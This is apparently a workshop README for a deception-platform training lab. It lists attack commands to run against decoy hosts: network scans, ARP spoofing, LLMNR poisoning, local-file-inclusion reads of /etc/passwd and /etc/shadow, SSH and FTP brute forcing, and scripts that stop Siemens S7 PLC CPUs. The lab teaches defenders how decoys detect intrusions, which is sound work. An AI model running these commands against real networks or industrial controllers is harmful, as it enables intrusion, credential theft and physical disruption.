# Welcome to the Advanced Threat Summit 2023

All you may need for the workshop is available in this repository.

## Getting the access
To begin with, please navigate to our test stand:
1. **Credentials to the AdminVM**
You may use any web browser of your choice.
```
URL: 
Username:
Password:  
```

2. **Credentials to the attacking host**
From this host you will perform your attacks. Please use SSH and following credentials:
```
Host:
Username:
Password:
```

## Terminology that will be used today
Due to the fact that today we are using Labyrinth Deception Platform as the example of the deception platfroms, it has its own therms that will be actively used today:
1. **Point** = network decoy, lure, deceptive network services.
> [!NOTE]
> Points ARE NOT separate virtual machines.
2. **Honeynet** = network segment in which Points operate. Used to specify in which VLAN you would like to run your Points.
3. **Seeder Tasks** = file decoys, breadcrumbs used to logically link real and deceptive infrastructure.
4. **Seeder Agent** = binary that spreads Seeder Tasks on real hosts.
5. **AdminVM (Management Console)**  = main module that controls the system.
6. **WorkerVM** = node on which Points are running.


## Commands transcript
In addition, we provide the transcript of all commands for your ease of use. Even if you missed any part of the presentation, feel free to use those notes to continue exploring.

> [!IMPORTANT]
> **\<any data>** indicates that you should paste in your own data that is entioned inside the triangular brackets.
>
> **[options]** indicates that this part (or parts) of the command is optional and can be omitted. Multiple options are listed using / (slash).

#### Case 1: network scan detection
```
nmap [-sS/sT/sW/sM/sU/sF/sX] ​<Point IP>
```

#### Case 2: connecting to the host using data from breadcrumbs 
1. Navigate to the Seeder Agents -> Tasks
2. Choose ssh_txt_credentials or ssh_config from the list
3. Click on three dots, and then Details
4. Use those credentials to login:
```
ssh <user>@<Point IP>
```

#### Case 3: ARP spoofing
```
sudo ettercap -i <interface> -T -M arp /<host 1>// /<host2>//
```
As an alternative you may use bettercap:
```
sudo bettercap
net.probe on
net.show
set arp.spoof.targets <Point IP>
set arp.spoof.fullduplex false
arp.spoof on
// po upływie pewnego czasu
arp.spoof off
```
References: [ettecap](https://www.ettercap-project.org/) and [bettercap](https://github.com/bettercap/bettercap) source

#### Case 4: LLMNR / NBT-NS Poisoning
For this we will be using *Responder*. It is already installed. All you need to do is to run a command:

```
cd Responder
sudo python2 Responder.py -I eth0
```
Reference: [Responder source](https://github.com/SpiderLabs/Responder)

#### Case 5: S7comm Malformed PDU
For this case there is a script that is available in this repo:
Simply run it: 
```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py -a <Point IP>
```
Or:
```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py --plc_ip_addr <Point IP>
```
#### Case 6: Local File Inclusion
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```

#### [Advanced] Case 7: reusing the credentials
1. Find Web Server
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
2. Perform LFI
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
or
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
```
3. Setup the wordlist
```
cd wordlists
nano brute.dict
```
4. Perfrom SSH bruteforce
```
hydra -l <username> -P brute.dict <IP of the ssh host> ssh -t 4 
```
5. Login to the host
```
ssh <user>@<Point IP>
```
6. Reuse credentials to connect to another host
```
ssh <user>@warrior.labyrinth.tech
```

#### [Advanced] Case 8: attacking industrial networks
1. Search network for FTP server
```
sudo nmap -sS -sC -p21 -T4 <Honeynet subnet> -vvv 
```
2. Connect to the FTP
Try to connect anonymously:
```
ftp <FTP IP address>
```
Start FTP bruteforce:
```
cd wordlists
nmap --script ftp-brute -p21 <FTP IP address> --script-args userdb=users.dict,passdb=passwords.dict
```
3. Inspect found file
```
ls -la
less <file>
```
4. Perform S7comm CPU control request
```
cd S7_scripts
python2 s7300stop.py 172.16.132.4
```
In addition, you can try to start CPU start message:
```
python2 s7300cpustart.py 172.16.132.2
```
Reference: [exploits source](https://github.com/hackerhouse-opensource/exploits)

## About Labyrinth Deception Platform
Labyrinth is a team of experienced cybersecurity engineers and penetration testers, which specializes in the development of solutions for early cyber threat detection and prevention.

Deception techniques provide adversaries with an essential advantage over defenders, who cannot predict attackers’ next move. **OUR VISION** is to shift the balance of power in favor of defenders.

**OUR MISSION** is to provide all kinds of organizations with a simple and efficient tool for the earliest possible detection of attackers inside the corporate network.

More information about the platform: https://labyrinth.tech/ 